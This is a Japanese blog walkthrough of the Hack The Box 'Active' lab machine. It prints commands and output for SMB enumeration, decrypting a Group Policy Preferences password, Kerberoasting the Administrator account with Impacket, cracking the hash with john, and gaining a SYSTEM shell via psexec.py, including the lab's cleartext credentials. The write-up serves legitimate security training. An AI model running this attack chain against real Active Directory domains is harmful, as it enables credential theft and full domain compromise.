+++ 
draft = false
date = 2022-07-01T17:14:07+09:00
title = "HTB_Active_writeup"
description = "HTB_Active_writeup"
slug = ""
authors = []
tags = ["HackTheBox","OSCP"]
categories = ["Cyber Security"]
externalLink = ""
series = []
+++

# 【Hack The Box】 Active Writeup
## Information
- OS：Windows  
- 難易度：Easy  
- IPアドレス：10.129.90.238  
{{< figure src="/images/Active1.png" title="Screenshot" class="center" width="800">}}

## Recon
### nmapでスキャンをし、OSがwindows_server_2008:r2:sp1、53・88・135・139・389・445などのAD系のサービスが稼働していることからADの問題だとわかります。
```shell
$ nmap -T4 -A -sV -sC 10.129.90.238
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-01 10:14 EDT
Nmap scan report for 10.129.90.217
Host is up (0.27s latency).
Not shown: 983 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-01 14:14:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-06-01T14:15:50
|_  start_date: 2022-06-01T13:25:16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.31 seconds
```

### enum4linuxによるドメイン、DNS、ユーザなどの列挙します。[+] Attempting to map shares on 10.129.90.238の「//10.129.90.238/Replication     Mapping: OK, Listing: OK」の部分に注目します。
```shell
[+] Attempting to map shares on 10.129.90.238
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.90.238/ADMIN$  Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.90.238/C$      Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.90.238/IPC$    Mapping: OK     Listing: DENIED
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.90.238/NETLOGON        Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.90.238/Replication     Mapping: OK, Listing: OK
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.90.238/SYSVOL  Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.129.90.238/Users   Mapping: DENIED, Listing: N/A
```

### smbmapによりsamba共有ドライずの一覧を表示します。
```shell
└─$ smbmap -R Replication -H 10.129.90.238                                                                      130 ⨯
[+] IP: 10.129.90.238:445       Name: 10.129.90.238                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Replication                                             READ ONLY
        .\Replication\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    active.htb
        .\Replication\active.htb\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    DfsrPrivate
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Policies
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    scripts
        .\Replication\active.htb\DfsrPrivate\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ConflictAndDeleted
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Deleted
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Installing
        .\Replication\active.htb\Policies\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    {31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    {6AC1786C-016F-11D2-945F-00C04fB984F9}
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--               23 Sat Jul 21 06:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Group Policy
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    USER
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--              119 Sat Jul 21 06:38:11 2018    GPE.INI
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Microsoft
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Preferences
        fr--r--r--             2788 Sat Jul 21 06:38:11 2018    Registry.pol
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Windows NT
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Groups
        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--               22 Sat Jul 21 06:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    USER
        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Microsoft
        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Windows NT
```

### 結果、グループポリシーの設定ファイルGroups.xmlが見つかりました。次のコマンド構文により、当該ファイルの取得を行います。
```shell
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018

                5217023 blocks of size 4096. 276954 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml 
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```

### Groups.xmlファイルの中身を確認します。userNameがactive.htb\SVC_TGS、cpasswordがedBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQです。
```shell
$ cat Groups.xml        
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

### gpp-decryptでパスワードを復号します。
```shell
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

### ユーザ名がSVC_TGS、パスワードがGPPstillStandingStrong2k18で、この認証情報を使用し、smbclientでuser.txtファイルを取得します。（フラグは省略しています）
```shell
]
└─$ smbclient -U svc_tgs //10.129.90.238/Users      
Enter WORKGROUP\svc_tgs's password: 
Try "help" to get a list of possible commands.
smb: \> cd Desktop
cd \Desktop\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \> ls
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                5217023 blocks of size 4096. 276954 blocks available
smb: \> cd SVC_TGS
smb: \SVC_TGS\> dir
  .                                   D        0  Sat Jul 21 11:16:32 2018
  ..                                  D        0  Sat Jul 21 11:16:32 2018
  Contacts                            D        0  Sat Jul 21 11:14:11 2018
  Desktop                             D        0  Sat Jul 21 11:14:42 2018
  Downloads                           D        0  Sat Jul 21 11:14:23 2018
  Favorites                           D        0  Sat Jul 21 11:14:44 2018
  Links                               D        0  Sat Jul 21 11:14:57 2018
  My Documents                        D        0  Sat Jul 21 11:15:03 2018
  My Music                            D        0  Sat Jul 21 11:15:32 2018
  My Pictures                         D        0  Sat Jul 21 11:15:43 2018
  My Videos                           D        0  Sat Jul 21 11:15:53 2018
  Saved Games                         D        0  Sat Jul 21 11:16:12 2018
  Searches                            D        0  Sat Jul 21 11:16:24 2018

                5217023 blocks of size 4096. 276954 blocks available
smb: \SVC_TGS\> cd Desktop
smb: \SVC_TGS\Desktop\> dir
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                           AR       34  Wed Jun  1 10:37:19 2022

                5217023 blocks of size 4096. 276954 blocks available
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \SVC_TGS\Desktop\> exit
                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ cat user.txt     
3f8...
```

## 権限昇格
### Kerberoasting 攻撃により、暗号化されたチケットを取得し、管理者パスワードを回復します。GetUserSPNs.pyにて、サービスへアクセスするためのTGSチケットを取得することを狙います。
```shell
└─$ sudo GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.90.238 -request               1 ⨯
Impacket v0.9.24.dev1+20211022.182843.4229481c - Copyright 2021 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2022-06-01 10:37:33.046520             



$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c95cd823bf96ad513ca008d7ab7d7a16$28a4c45a87dc93afe717209d7f5bc3421b0612762da8119195905a19a7c97beccd56a8763228ca26fd00197c8408a9cdccb1bea45a513160324f86f14e6b43476f46aae7712b1901f66516dfd2bb0fc706c93bcc2829678970e2f6d785299cd5b229bcc3c24de75af2ff4a6f317e1ec60e355f166c1559f30a00f0e98f83b08cd9456716fc0cdecc60a46baec59a33d4adc1e8194be9d8f5d2936ecc312b7b005520574d9eb4d67d596dd104e09dfb3c4a824b609e4b2751bd0e88eca646f1302ad73713595c2263a7b4c53ab1de9eff86a2cf58b54f04a3f8d8088391d613181d654a28e6a7ecb251b424f0f894655e1fb493644e2964e73baf790ff8c332bc4f1715d34228748d58e1c435b0da8834d5a4d3c23a5e6ed39f88dbb4bb5a4dfb825c2926baa9d3b71f1f6148d222cd7456805e11be0466d74fea4f800d398632b6dcd0b20561d6a931099cd08e3c978d756c582101ee862ba73810c621cc0bf3a7a5de22fcd1d472171c30667c96cb5ec956f325d3bb55329226607caf172b28d6ca75c3711c11658a0cc5f6aa96079bba81e55db2dbd339c0b512368df589d00c2c91817f9585cd6695b99a77cf518f6238dea87008440d4580e70a38aace39d1cbfe6c8dc57d88193502157ac362fe4cb70a33175620d6acd473990e68927694486db9bc04dbd25c612b1d09e20fe40de46929b89eb9f2fb0e32ce5f59fb9841c9ac69053bc0e39ce2c292c52e27714dadd8a4593e6cf05c89c647f3370a96b5e9f314831f6018515189eba210f86849e020dc46dae535da048dca44f9b6209eaaabb4714d2c352c282b627aa4c58bb46ea652062d8a8927ff32d584c6a3228bf4d011158dad298b5feee4a38f2807c9e6fce45ea99b181536c17cc5fdbcbbe6558d4cae736fe3839e4e1b7417b8010d1a9043ec4d32cf800166fded201ae3fba85434462a6f17a0a2c45dbf1230eaa14099c53eecb47afa6ed9cb94503ac51785f1feaaa7ca56532cd9d62dd4a8d16bf2480924b27f3eac005836c8bcb8a1c9edf636d16fa8716044c4ec88a1cdd3a814ee98d8837e5a506276a66857373b3ec71fc4cb4b36c1b97f6dc1a67e9d2294cfd244cfffed402aeebf1d4f8d362e952adafaa58c2dc4484998fa23d35bdc4b9dd9cb2361dcbf53e5817bce2532ce69f7f36e647251aaf65ac525d892a8e51370a46ca7ff9064ede666a380339ac2ef96a79cedd34731813573c63428c1fd8b377acf9f70826102e
```

### johnでハッシュ解析をします。
```shell
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt                     
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:07 DONE (2022-06-02 07:31) 0.1288g/s 1357Kp/s 1357Kc/s 1357KC/s Tiffani1432..Tiago_18
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### psexec.pyで管理者権限のシェルを取ります。
```shell
sudo psexec.py administrator:Ticketmaster1968@active.htb                                                      1 ⨯
Impacket v0.9.24.dev1+20211022.182843.4229481c - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on active.htb.....
[*] Found writable share ADMIN$
[*] Uploading file DfKLSavA.exe
[*] Opening SVCManager on active.htb.....
[*] Creating service xQmn on active.htb.....
[*] Starting service xQmn.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> 
```

### フラグを取得します。（フラグは省略しています）
```shell
C:\Users\Administrator\Desktop> type root.txt
f63...
```